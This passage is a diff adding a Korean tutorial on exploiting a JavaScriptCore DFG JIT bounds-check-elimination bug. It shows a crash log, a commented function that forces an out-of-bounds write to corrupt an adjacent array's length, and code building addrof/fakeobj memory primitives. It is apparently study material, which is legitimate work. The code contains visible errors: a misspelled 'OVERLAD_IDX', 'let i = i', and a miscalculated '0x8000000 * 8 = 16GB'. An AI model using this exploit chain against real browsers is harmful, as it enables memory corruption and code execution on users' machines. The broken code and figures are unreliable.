@@ -349,5 +349,158 @@ for (let i = i; i <= ITERATIONS; i++) {
 }
 ```
 
+위의 코드를 실행시키면 다음과 같이 크래쉬가 납니다.
 
- 
+```shell
+lldb -- /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
+   (lldb) r
+   Process 12237 stopped
+   * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1c1fc61348)
+       frame #0: 0x000051fcfaa06f2e
+   ->  0x51fcfaa06f2e: movsd  xmm0, qword ptr [rax + 8*rcx] ; xmm0 = mem[0],zero
+   Target 0: (jsc) stopped.
+   (lldb) reg read rcx
+        rcx = 0x0000000080000000
+```
+(주어진 파일 환경에서는 어떤 이유에서 인지,, Reproduce가 되지 않았습니다.. ㅠㅜ)
+
+위의 로그를 살펴보면 OOB Read가 일어난 것을 확인할 수 있습니다.
+
+그러나 여기서 문제점은 인덱스에 해당하는 rcs가 항상 INT_MIN으로 고정된다는 것입니다.
+
+즉 `0x8000000 * 8 = 16GB` 뒤의 메모리에 접근하게 됩니다.
+
+이 버그는 이론적으로는 익스플로잇이 가능하지만, 초기 익스플로잇 방법으로는 적절하지 않습니다.
+
+따라서 우리는 **특정한 값을 i에서 빼서 INT_MIN을 임의의 양수**로 변환하는 과정을 통해, 공격자가 원하는 곳의 인덱스를 읽을 수 있도록 할 것입니다.
+
+DFG 컴파일러는 i가 항상 양수라고 잘못 가정하기 때문에, 이 뻴셈 연산이 **체크되지 않은 연산**으로 처리되며, 오버플로우가 발생해도 이를 탐지하지 않습니다.
+
+그러나 뻴셈을 수행하게되면 이전 i의 대한 정보가 무효화되기 때문에 다시 경계 검사 제거를 수행해주어야 합니다.
+
+이를 위해 if(i > 0)을 추가해줘서 다시 경게 검사가 제거될 수 있도록 해줍니다.
+
+또한 값을 빼는 과정에서 사용되는 정상적인 인덱스 값을 OOB 값으로 바뀌어 질 수도 있습니다. 
+
+따라서 해당 연산은 입력값이 음수일 경우(INT_MIN)에만 실행될 수 있도록 조건부로 수행해주어야 합니다.
+
+해당 버전 DFG 컴파일러는 if (n < 0)이 항상 참이 아니라는 것을 판단하지 않아 최적화가 진행되지 않고 그대로 남아있게 됩니다.
+
+밑의 코드는 설명하는 주석이 추가된 버전입니다.
+
+이 함수는 JIT 컴파일 후 n에 INT_MIN을 전달하면 메모리 내 arr 바로 뒤에 위치한 JSArray의 길이 필드를 OOB 쓰기로 조작하게 됩니다.
+
+이 단계의 성공 여부는 **정확한 힙 레이아웃**이 존재하는지에 달려있습니다.
+
+해당 버그는 제어 가능한 영역에 대해서도 OOB Read를 수행할 수 있기 때문에, 메모리 손상을 트리거 하기 전에 올바른 힙 레이아웃을 조정하는 것이 가능합니다.
+```js
+function hax(arr, n) {
+    // n을 32비트 정수로 강제 변환
+    n |= 0;
+
+    //IntegerRangeOptimization이 n이 음수임을 알도록 유도
+    if (n < 0) {
+        // 숫자가 아닌 바이트코드를 사용하도록 하여 부호 반전 연산(ArithMode)이 체크되지 않도록 유도
+        // 즉, 마지막 반복에서 INT_MIN이 다시 INT_MIN이 되도록 하기
+        let v = (-n) | 0;
+
+        // 이 단계에선 n이 음수임이 보장되므로, Math.abs(n)은 ArithNegate 연산으로 바뀜
+        // 원래 해당 연산은 체크된 ArithNegate로 되어야 하지만, 이전에 체크되지 않은 ArithNegate가 CSE로 인해 대체됩니다.
+        let i = Math.abs(n);
+
+        // 위의 과정으로 인해 IntegerRangeOptimization은 i가 항상 0 이상이라고 잘못 판단을 하게 됨
+
+        if (i < arr.length) {
+            // 이 조건문 안에선 IntergerRangeOptimization이 i가 항상 arr.length 범위 내에 있다고 판단함
+            // 하지만 마지막 반복에서 실제로 i는 INT_MIN이 됨
+
+            // 밑의 조건문은 IntegerRangeOptimization이 i가 음수 임을 판단하지 못하도록 하기 위함
+            if (i & 0x80000000) {
+                // 마지막 반복에서 밑의 연산을통해 INT_MIN이 임의의 양수로 변환되게 됨
+                // ArithAdd 연산이 IntegerRangeOptimization에 의해 체크되지 않은 연산으로 바뀌었기 때문에
+                // 오버플로우가 발생되어도 예외처리가 발생하지 않음
+                i += -0x7ffffff9;
+            }
+
+            // 위의 코드 실행으로 인해 IntegerRangeOptimization이 i가 항상 양수임을 증명할 수 없게 됨
+            // 따라서 경계 검사를 다시 제거하기 위해 추가적인 조건문이 필요함
+            if (i > 0) {
+                // 이 단계에서 IntegerRangeOptimization은 다시 i가 arr.length 범위 내에 있다고 생각하여 경계 검사를 제거함
+                // 경계 검사 제거로 인해 OOB 영역에 대해 접근이 가능하게 됨
+                // 결과적으로 이 버그로 인해 arr 바로 뒤에 있는 JSArray의 헤더가 손상됨
+                arr[i] = 1.04380972981885e-310;
+            }
+        }
+    }
+}
+```
+
+
+## Addrof/Fakeobj
+
+이 단계에서, 두 개의 low-level exploit primitives인 addrof와 fakeobj를 구성할 수 있습니다.
+
+- addrof(obj): JS 객체의 메모리 주소를 **부동소수점** 형태로 반환하는 primitive.
+```js
+// addrof(obj)
+let obj = {a: 42};
+let addr = addrof(obj);
+```
+```shell
+2.211548541e-314 (0x000000010acdc250 as 64bit integer)
+```
+
+메모리의 주소가 64비트로 변환되어 출력됩니다.
+
+- fakeobj(addr): 주어진 메모리 주소를 JSValue로 변환하여 JS 객체로 변환하는 primitive.
+```js
+let obj2 = fakeobj(addr);
+obj2 === obj;
+```
+```shell
+true
+```
+
+위의 객체를 통해 메모리 주소를기반으로 실제 JS 객체를 조작할 수 있게 됩니다.
+
+위의 primitive들은 두 가지의 중요한 역할을 수행합니다.
+1. 제어 가능한 데이터를 예측 가능한 주소에 배치를 통해 힙 ASLR 우회
+2. 임의의 메모리 주소를 포함한 JS 객체를 생성하여 가짜 객체 생성 및 엔진 내 삽입
+
+이 primitive들은 서로 다른 스토리지 타입을 가진 두 개의 JSArray를 겹쳐서 생성할 수도 있습니다.
+- 첫 번째 JSArray -> 부동소수점 값을 저장
+- 두 번째 JSArray -> JSValues 저장
+
+이 겹치는 배열 구조를 이용하면, JS 객체의 메모리 주소를 직접 읽거나, **조작된 메모리 주소로 객체를 생성**하는 것이 가능해집니다.
+
+![객체 사진](./JIT_BUG/1.png)
+
+위의 과정을 실행하는 코드는 다음과 같습니다.
+```js
+let noCoW = 13.37;
+let target = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
+let float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
+let obj_arr = [{}, {}, {}, {}, {}, {}, {}];
+
+hax(target, n);
+
+assert(float_arr.length == 0x1337);
+
+const OVERLAP_IDX = 8;
+
+function addrof(obj) {
+    obj_arr[0] = obj;
+    return float_arr[OVERLAP_IDX];
+}
+
+function fakeobj(addr) {
+    float_arr[OVERLAD_IDX] = addr;
+    return obj_arr[0];
+}
+```
+
+위의 코드에서 noCoW를 추가하는 이유는 JSC가 배열을 **Copy-on-Write**로 할당하는 것을 방지하기 위함입니다.
+
+이것을 방지하지 않으면 예상한 힙 레이아웃이 깨져 코드가 정상적으로 실행되지 않을 수 있기 때문에 이 점을 주의하여 사용하여야 합니다.
+
+이 다음 내용부터는 2편에서 addrof와 fakeobj을 사용하여 임의 영역에 읽기 및 쓰기를 수행하는 방법에 대해서 다뤄보겠습니다.
